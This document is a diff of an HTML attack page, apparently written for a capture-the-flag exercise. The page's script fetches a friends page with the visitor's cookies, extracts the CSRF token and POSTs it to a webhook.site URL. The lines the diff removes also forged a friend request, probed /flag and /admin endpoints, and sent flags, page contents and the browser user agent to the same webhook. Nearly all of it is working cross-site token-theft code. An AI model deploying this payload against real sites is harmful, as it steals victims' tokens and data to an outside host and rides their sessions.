@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CTF CSRF Flag Extractor</title>
+    <title>CSRF Token Extractor</title>
 </head>
 <body>
-    <h1>Extracting CSRF Token and Flag...</h1>
+    <h1>Extracting CSRF Token...</h1>
     
     <script>
         const WEBHOOK_URL = 'https://webhook.site/60b2c32b-f130-442d-9eca-da173d2d3634';
@@ -12,7 +12,6 @@
         // Function to send data to webhook
         async function sendToWebhook(data) {
             try {
-                console.log("Sending to webhook:", data);
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: {
@@ -20,208 +19,48 @@
                     },
                     body: JSON.stringify(data)
                 });
-                console.log("Successfully sent to webhook");
             } catch (error) {
                 console.log("Webhook error:", error.message);
-                // Try with a simple GET request as fallback
-                try {
-                    await fetch(WEBHOOK_URL + '?data=' + encodeURIComponent(JSON.stringify(data)));
-                } catch (e) {
-                    console.log("Fallback webhook failed:", e.message);
-                }
             }
         }
         
-        // Function to extract CSRF token and get flag
-        async function extractCSRFAndGetFlag() {
+        // Function to extract CSRF token only
+        async function extractCSRFToken() {
             try {
-                console.log("Starting CSRF token extraction and flag retrieval...");
+                console.log("Fetching /friends page...");
                 
-                // Step 1: Get the friends page to extract CSRF token
-                const friendsResponse = await fetch('http://web:3000/friends', {
+                const response = await fetch('http://web:3000/friends', {
                     credentials: 'include'
                 });
                 
-                const friendsHtml = await friendsResponse.text();
-                console.log("Fetched friends page HTML");
+                const html = await response.text();
                 
                 // Parse HTML to extract CSRF token
                 const parser = new DOMParser();
-                const doc = parser.parseFromString(friendsHtml, 'text/html');
+                const doc = parser.parseFromString(html, 'text/html');
                 
-                // Look for the specific CSRF token in the form
+                // Look for CSRF token in the form
                 const csrfInput = doc.querySelector('form[action="/friends/request"] input[name="csrf_token"]');
                 
-                if (!csrfInput) {
-                    console.log("CSRF token not found in expected location");
-                    // Try alternative selectors
-                    const altCsrfInput = doc.querySelector('input[name="csrf_token"]');
-                    if (altCsrfInput) {
-                        console.log("Found CSRF token in alternative location");
-                    } else {
-                        throw new Error("CSRF token not found anywhere");
-                    }
-                }
-                
-                const csrfToken = csrfInput ? csrfInput.value : doc.querySelector('input[name="csrf_token"]').value;
-                console.log("Extracted CSRF Token:", csrfToken);
-                
-                // Send CSRF token to webhook
-                await sendToWebhook({
-                    step: 'csrf_extracted',
-                    csrf_token: csrfToken,
-                    timestamp: new Date().toISOString()
-                });
-                
-                // Step 2: Use CSRF token to make friend request (this might trigger the flag)
-                console.log("Making friend request with CSRF token...");
-                
-                const formData = new FormData();
-                formData.append('username', 'admin'); // Try common usernames
-                formData.append('csrf_token', csrfToken);
-                
-                const requestResponse = await fetch('http://web:3000/friends/request', {
-                    method: 'POST',
-                    credentials: 'include',
-                    body: formData
-                });
-                
-                const requestResult = await requestResponse.text();
-                console.log("Friend request response:", requestResult);
-                
-                // Check if the response contains a flag
-                const flagMatch = requestResult.match(/flag\{[^}]+\}/i) || requestResult.match(/ctf\{[^}]+\}/i) || requestResult.match(/[a-f0-9]{32,}/);
-                
-                if (flagMatch) {
-                    const flag = flagMatch[0];
-                    console.log("FLAG FOUND:", flag);
+                if (csrfInput) {
+                    const csrfToken = csrfInput.value;
+                    console.log(csrfToken);
                     
+                    // Send to webhook
                     await sendToWebhook({
-                        step: 'flag_found',
-                        flag: flag,
-                        csrf_token: csrfToken,
-                        response: requestResult,
-                        timestamp: new Date().toISOString()
+                        csrf_token: csrfToken
                     });
                 } else {
-                    console.log("No flag found in friend request response, trying other endpoints...");
-                    
-                    // Step 3: Try accessing other endpoints that might contain the flag
-                    const endpoints = [
-                        '/flag',
-                        '/admin',
-                        '/friends',
-                        '/profile',
-                        '/dashboard'
-                    ];
-                    
-                    for (const endpoint of endpoints) {
-                        try {
-                            console.log(`Trying endpoint: ${endpoint}`);
-                            const endpointResponse = await fetch(`http://web:3000${endpoint}`, {
-                                credentials: 'include',
-                                headers: {
-                                    'X-CSRF-Token': csrfToken
-                                }
-                            });
-                            
-                            const endpointHtml = await endpointResponse.text();
-                            const endpointFlagMatch = endpointHtml.match(/flag\{[^}]+\}/i) || endpointHtml.match(/ctf\{[^}]+\}/i);
-                            
-                            if (endpointFlagMatch) {
-                                const flag = endpointFlagMatch[0];
-                                console.log(`FLAG FOUND at ${endpoint}:`, flag);
-                                
-                                await sendToWebhook({
-                                    step: 'flag_found_endpoint',
-                                    flag: flag,
-                                    endpoint: endpoint,
-                                    csrf_token: csrfToken,
-                                    response: endpointHtml.substring(0, 1000),
-                                    timestamp: new Date().toISOString()
-                                });
-                                return;
-                            }
-                        } catch (e) {
-                            console.log(`Error accessing ${endpoint}:`, e.message);
-                        }
-                    }
-                    
-                    // Send the friend request response for analysis
-                    await sendToWebhook({
-                        step: 'no_flag_found',
-                        csrf_token: csrfToken,
-                        friend_request_response: requestResult,
-                        timestamp: new Date().toISOString()
-                    });
+                    console.log("CSRF token not found");
                 }
                 
             } catch (error) {
-                console.log("Error during extraction:", error.message);
-                await sendToWebhook({
-                    step: 'error',
-                    error: error.message,
-                    timestamp: new Date().toISOString()
-                });
+                console.log("Error:", error.message);
             }
         }
         
-        // Alternative method: Try to make authenticated requests to common flag endpoints
-        async function tryDirectFlagAccess() {
-            const flagEndpoints = [
-                '/flag',
-                '/admin/flag',
-                '/api/flag',
-                '/secret',
-                '/admin'
-            ];
-            
-            for (const endpoint of flagEndpoints) {
-                try {
-                    console.log(`Direct flag access attempt: ${endpoint}`);
-                    const response = await fetch(`http://web:3000${endpoint}`, {
-                        credentials: 'include'
-                    });
-                    
-                    const content = await response.text();
-                    const flagMatch = content.match(/flag\{[^}]+\}/i) || content.match(/ctf\{[^}]+\}/i);
-                    
-                    if (flagMatch) {
-                        const flag = flagMatch[0];
-                        console.log(`DIRECT FLAG FOUND at ${endpoint}:`, flag);
-                        
-                        await sendToWebhook({
-                            step: 'direct_flag_found',
-                            flag: flag,
-                            endpoint: endpoint,
-                            timestamp: new Date().toISOString()
-                        });
-                        return;
-                    }
-                } catch (e) {
-                    console.log(`Direct access to ${endpoint} failed:`, e.message);
-                }
-            }
-        }
-        
-        // Start the extraction process
-        console.log("CTF CSRF Flag Extractor started");
-        sendToWebhook({
-            step: 'initialization',
-            message: 'CTF CSRF Flag Extractor started',
-            user_agent: navigator.userAgent,
-            url: window.location.href,
-            timestamp: new Date().toISOString()
-        });
-        
-        // Try direct flag access first
-        tryDirectFlagAccess();
-        
-        // Then try the CSRF-based approach
-        setTimeout(() => {
-            extractCSRFAndGetFlag();
-        }, 1000);
-        
+        // Start extraction
+        extractCSRFToken();
     </script>
 </body>
 </html>
